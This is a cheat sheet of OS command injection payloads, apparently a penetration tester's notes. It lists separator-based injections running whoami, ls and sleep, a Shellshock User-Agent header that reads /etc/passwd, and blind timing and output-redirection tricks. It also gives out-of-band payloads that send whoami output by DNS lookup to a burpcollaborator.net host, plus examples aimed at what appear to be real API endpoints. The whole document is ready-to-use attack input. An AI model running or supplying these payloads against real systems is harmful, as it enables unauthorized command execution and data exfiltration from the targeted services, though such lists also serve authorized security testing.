# OS Command Injection Payloads
___
## Wordlist
```sh
;whoami;
;sleep+10;
nslookup+burpcollaborator.net
```
## Simple Case
```sh
& echo test &

& whoami #

;ls

;ls;

User-Agent: () { :; }; echo ; /bin/bash -c "cat /etc/passwd" >> In User-Agent Header.
```
## Blind injection
```sh
& sleep 10 #

; sleep 10 ;

asd||sleep 5|| >> Middle of two parameter.

||ping+-c+10+127.0.0.1||

& ping -c 10 127.0.0.1

asd||sleep 5 # >> Last parameter or to comment out extra parameter
```
## Blind injection with output redirection

```sql
& whoami > /var/www/static/output.txt #

; whoami > /var/www/static/output.txt ;
```

## Out of band
```sh
& nslookup xgvse45vdusd5etw7ewqd9d78wq.burpcollaborator.net #

& nslookup `whoami`.xgvse45vdusd5etw7ewqd9d78wq.burpcollaborator.net #

& nslookup $(whoami).xgvse45vdusd5etw7ewqd9d78wq.burpcollaborator.net #

|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1

Example-01: /api/v1/pdf/generate_zip?seed_id=521b62f5b7132de722027388|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1

Example-02: https://api.seedr.ru/uploads/521b62f5b7132de722027388|nslookup -q=cname 0vwm3493ytajvrc4a2g7ptfmgdm7a04o0crzhn6.burpcollaborator.net.&.zip
```
